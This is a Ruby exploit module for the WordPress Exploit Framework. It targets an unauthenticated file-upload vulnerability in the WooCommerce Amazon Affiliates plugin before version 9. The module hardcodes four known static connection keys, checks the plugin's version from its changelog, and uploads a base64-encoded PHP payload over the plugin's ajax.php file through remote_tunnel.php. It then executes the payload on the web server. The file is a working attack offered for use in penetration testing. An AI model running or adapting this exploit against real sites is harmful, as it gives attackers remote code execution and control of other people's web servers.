# frozen_string_literal: true

class Wpxf::Exploit::WoocommerceAmazonAffiliatesV8ShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'WooCommerce Amazon Affiliates < v9 Unauthenticated Shell Upload',
      desc: %(
        This module exploits a file upload vulnerability which allows users
        to upload and execute PHP scripts in the context of the web server.

        In order to use this module, a valid connection key must be provided.
        These are statically defined keys, that have been changed on a number
        of occasions.

        Some of the keys that have been identified are:
         - 1ec4614ce9b023d2a58deef6dcabb6ab
         - c125a47cba1e8ec73945dd622d142f79
         - 69efc4922575861f31125878597e97cf
         - 501d0292aca8270d539662a5a9aad855
      ),
      author: [
        'Evex_1337', # Discovery and disclosure
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '7940']
      ],
      date: 'Apr 25 2015',
      desc_preformatted: true
    )

    register_option(
      StringOption.new(
        name: 'connection_key',
        desc: 'The plugin connection key, see module description for static keys',
        required: true
      )
    )
  end

  def emit_usage_info
    emit_warning 'When executing this module, the ajax.php file in woozone/modules/remote_support will be deleted. '\
                 'In order to be able to re-use this module on the same target, be sure to re-create ajax.php if ' \
                 'the selected payload is unable to re-create it automatically.'
  end

  def check
    readme = normalize_uri(wordpress_url_plugins, 'woozone', 'changelog.txt')
    check_version_from_custom_file(readme, /##\s\[(\d\.\d(\.\d)*)\]/, '9')
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'woozone', 'modules', 'remote_support', 'remote_tunnel.php')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_field('connection_key', datastore['connection_key'])
    builder.add_field('action', 'save_file')
    builder.add_field('file', 'ajax.php')
    builder.add_field('file_content', Base64.strict_encode64(payload.encoded))
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_plugins, 'woozone', 'modules', 'remote_support', 'ajax.php')
  end

  def validate_upload_result
    upload_result.body !~ /Invalid\skey!/i
  end

  def run
    payload.enqueue_command('echo "" > ajax.php')
    super
  end
end
